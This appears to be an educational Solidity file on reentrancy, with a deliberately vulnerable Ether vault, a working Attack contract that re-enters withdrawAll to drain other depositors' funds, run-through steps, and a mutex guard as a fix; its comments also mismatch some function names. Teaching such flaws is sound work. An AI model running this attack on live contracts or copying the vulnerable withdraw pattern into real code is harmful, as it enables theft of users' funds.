// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
Reentrancy is programmatic approach in which an attacker performs recursive withdraws to steal all Ethers locked in a contract.

EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy InsecureEtherVault
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into InsecureEtherVault
3. Deploy Attack with address of InsecureEtherVault
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ether back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call InsecureEtherVault.withdraw multiple times before
InsecureEtherVault.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- InsecureEtherVault.deposit
- InsecureEtherVault.withdraw
- Attack fallback (receives 1 Ether)
- InsecureEtherVault.withdraw
- Attack.fallback (receives 1 Ether)
- InsecureEtherVault.withdraw
- Attack fallback (receives 1 Ether)

There are three preventive solutions to tackle the reentrancy attack:
    1. Applying the checks-effects-interactions pattern
    2. Applying the mutex lock
    3. Using both solutions #1 and #2

*/

contract InsecureEtherVault {
    mapping (address => uint256) private userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        uint256 balance = getUserBalance(msg.sender); // Check
        require(balance > 0, "Insufficient balance");

        
        (bool success, ) = msg.sender.call{value: balance}(""); // Interaction
        require(success, "Failed to send Ether");

        userBalances[msg.sender] = 0; // Effect (this should happen before interaction to fix the reentrancy)

    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }
}

interface IEtherVault {
    function deposit() external payable;
    function withdrawAll() external;
}


contract Attack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// This is used for Mutex lock => In rust mutex means to lock something to not be executed in the same time in multiple threads. Meaning only one thread can use and update a value at a time.
abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}